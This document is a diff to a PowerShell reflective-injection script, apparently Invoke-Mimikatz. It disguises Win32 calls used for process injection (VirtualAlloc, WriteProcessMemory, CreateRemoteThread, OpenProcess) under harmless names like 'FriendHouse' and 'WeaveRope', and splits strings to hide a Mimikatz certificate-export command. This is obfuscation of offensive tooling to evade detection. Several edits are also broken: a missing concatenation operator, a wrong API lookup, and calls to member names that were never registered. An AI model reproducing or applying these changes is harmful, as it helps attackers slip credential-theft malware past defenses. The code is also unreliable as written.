@@ -422,16 +422,17 @@ $RemoteScriptBlock = {
 	Function Get-Win32Functions
 	{
 		$Win32Functions = New-Object System.Object
+		$FriendHouseName = "Virtua" + "lAlloc"
+		$FriendHouseAddr = Get-ProcAddress kernel32.dll $FriendHouseName
+		$FriendHouseDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$FriendHouse = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FriendHouseAddr, $FriendHouseDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name $FriendHouseName -Value $FriendHouse
 		
-		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
-		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
-		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
-		
-		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
-		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
-		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
-		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
+		$FriendHouseExName = $FriendHouseName + "Ex"
+		$FriendHouseExAddr = Get-ProcAddress kernel32.dll FriendHouseEx
+		$FriendHouseExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+		$FriendHouseEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FriendHouseExAddr, $FriendHouseExDelegate)
+		$Win32Functions | Add-Member NoteProperty -Name $FriendHouseExName -Value $FriendHouseEx
 		
 		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
 		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
@@ -483,30 +484,33 @@ $RemoteScriptBlock = {
 		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
 		
-		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
-	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
+		$UntieShoeName = "Ope" + "nProcess"
+		$UntieShoeAddr = Get-ProcAddress kernel32.dll $UntieShoeName
+	    $UntieShoeDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+	    $UntieShoe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UntieShoeAddr, $UntieShoeDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name $UntieShoeName -Value $UntieShoe
 		
 		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
 	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
 	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
 		
-		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
-        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
-        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+		$TieShoeName = "Writ" + "eProce" "ssMemory"
+		$TieShoeAddr = Get-ProcAddress kernel32.dll $TieShoeName
+        $TieShoeDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $TieShoe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TieShoeAddr, $TieShoeDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name $TieShoeName -Value $TieShoe
 		
 		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
         $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
         $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
 		
-		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
-        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
+		$WeaveRopeName = "Creat" + "eRemo" + "teThre" + "ad"
+		$WeaveRopeAddr = Get-ProcAddress kernel32.dll $WeaveRopeName
+        $WeaveRopeDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+        $WeaveRope = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WeaveRopeAddr, $WeaveRopeDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name $WeaveRopeName -Value $WeaveRope
 		
 		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
         $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
@@ -907,7 +911,7 @@ $RemoteScriptBlock = {
 	}
 	
 	
-	Function Invoke-CreateRemoteThread
+	Function Invoke-WeaveRope
 	{
 		Param(
 		[Parameter(Position = 1, Mandatory = $true)]
@@ -944,8 +948,8 @@ $RemoteScriptBlock = {
 
 		else
 		{
-			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
-			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
+			Write-Verbose "Windows XP/8 detected, using WeaveRope. Address of thread: $StartAddress"
+			$RemoteThreadHandle = $Win32Functions.WeaveRope.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
 		}
 		
 		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
@@ -1117,14 +1121,14 @@ $RemoteScriptBlock = {
 		
 		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
 		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
-		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		$RImportDllPathPtr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to allocate memory in the remote process"
 		}
 
 		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
-		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
+		$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
 		
 		if ($Success -eq $false)
 		{
@@ -1144,7 +1148,7 @@ $RemoteScriptBlock = {
 		if ($PEInfo.PE64Bit -eq $true)
 		{
 
-			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+			$LoadLibraryARetMem = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
 			{
 				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
@@ -1177,23 +1181,23 @@ $RemoteScriptBlock = {
 			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
 
 			
-			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			if ($RSCAddr -eq [IntPtr]::Zero)
 			{
 				Throw "Unable to allocate memory in the remote process for shellcode"
 			}
 			
-			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+			$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 			{
 				Throw "Unable to write shellcode to remote process memory."
 			}
 			
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+			$RThreadHandle = Invoke-WeaveRope -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
-				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+				Throw "Call to WeaveRope to call GetProcAddress failed."
 			}
 			
 
@@ -1210,11 +1214,11 @@ $RemoteScriptBlock = {
 		}
 		else
 		{
-			[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
+			[IntPtr]$RThreadHandle = Invoke-WeaveRope -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
 			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 			if ($Result -ne 0)
 			{
-				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+				Throw "Call to WeaveRope to call GetProcAddress failed."
 			}
 			
 			[Int32]$ExitCode = 0
@@ -1254,14 +1258,14 @@ $RemoteScriptBlock = {
 		
 
 		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
-		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		$RFuncNamePtr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($RFuncNamePtr -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to allocate memory in the remote process"
 		}
 
 		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
-		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
+		$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
 		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
 		if ($Success -eq $false)
 		{
@@ -1278,7 +1282,7 @@ $RemoteScriptBlock = {
 
 		
 
-		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+		$GetProcAddressRetMem = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
@@ -1328,23 +1332,23 @@ $RemoteScriptBlock = {
 		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
 		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
 		
-		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+		$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 		if ($RSCAddr -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to allocate memory in the remote process for shellcode"
 		}
 		
-		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+		$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 		{
 			Throw "Unable to write shellcode to remote process memory."
 		}
 		
-		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+		$RThreadHandle = Invoke-WeaveRope -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 		if ($Result -ne 0)
 		{
-			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+			Throw "Call to WeaveRope to call GetProcAddress failed."
 		}
 		
 
@@ -2197,10 +2201,10 @@ $RemoteScriptBlock = {
 		if ($RemoteLoading -eq $true)
 		{
 
-			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+			$PEHandle = $Win32Functions.FriendHouse.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			
 
-			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			$EffectivePEHandle = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			if ($EffectivePEHandle -eq [IntPtr]::Zero)
 			{
 				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
@@ -2210,11 +2214,11 @@ $RemoteScriptBlock = {
 		{
 			if ($NXCompatible -eq $true)
 			{
-				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+				$PEHandle = $Win32Functions.FriendHouse.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			}
 			else
 			{
-				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				$PEHandle = $Win32Functions.FriendHouse.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 			}
 			$EffectivePEHandle = $PEHandle
 		}
@@ -2222,7 +2226,7 @@ $RemoteScriptBlock = {
 		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
 		if ($PEHandle -eq [IntPtr]::Zero)
 		{ 
-			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
+			Throw "FriendHouse failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
 		}		
 		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
 		
@@ -2280,7 +2284,7 @@ $RemoteScriptBlock = {
 		if ($RemoteLoading -eq $true)
 		{
 			[UInt32]$NumBytesWritten = 0
-			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
+			$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
 			if ($Success -eq $false)
 			{
 				Throw "Unable to write shellcode to remote process memory."
@@ -2333,23 +2337,23 @@ $RemoteScriptBlock = {
 				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
 				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
 				
-				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
 				if ($RSCAddr -eq [IntPtr]::Zero)
 				{
 					Throw "Unable to allocate memory in the remote process for shellcode"
 				}
 				
-				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+				$Success = $Win32Functions.TieShoe.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
 				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
 				{
 					Throw "Unable to write shellcode to remote process memory."
 				}
 
-				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+				$RThreadHandle = Invoke-WeaveRope -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
 				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
 				if ($Result -ne 0)
 				{
-					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
+					Throw "Call to WeaveRope to call GetProcAddress failed."
 				}
 				
 				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
@@ -2501,7 +2505,7 @@ $RemoteScriptBlock = {
 		
 		if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		{
-			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
+			$RemoteProcHandle = $Win32Functions.UntieShoe.Invoke(0x001F0FFF, $false, $ProcId)
 			if ($RemoteProcHandle -eq [IntPtr]::Zero)
 			{
 				Throw "Couldn't obtain the handle for process ID: $ProcId"
@@ -2610,7 +2614,7 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
 
-			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+			$RThreadHandle = Invoke-WeaveRope -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 		}
 		
 
@@ -2652,7 +2656,7 @@ Function Main
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "InviteFriends")
     {
-        $ExeArgs = "cry" + "pto::" + "cng " + "cryp" + "to::" + "capi " + "`"cryp" + "to::cer" + "tific" + "ates  " + "/exp" + "ort`"" + "`"cryp" + "to::cer" + "tific" + "ates " + "/exp" + "ort`" " + "/syst" + "emstore:" + "CE" + "RT_" + "SYSTE" + "M_ST" + "ORE_" + "LOC" + "AL" + "_MAC" + "HINE`" " + "exit"
+      $ExeArgs = "cry" + "pto::" + "cng " + "cryp" + "to::" + "capi " + "`"cryp" + "to::cer" + "tific" + "ates  " + "/exp" + "ort`"" + "`"cryp" + "to::cer" + "tific" + "ates " + "/exp" + "ort`" " + "/syst" + "emstore:" + "CE" + "RT_" + "SYSTE" + "M_ST" + "ORE_" + "LOC" + "AL" + "_MAC" + "HINE`" " + "exit"
     }
     else
     {
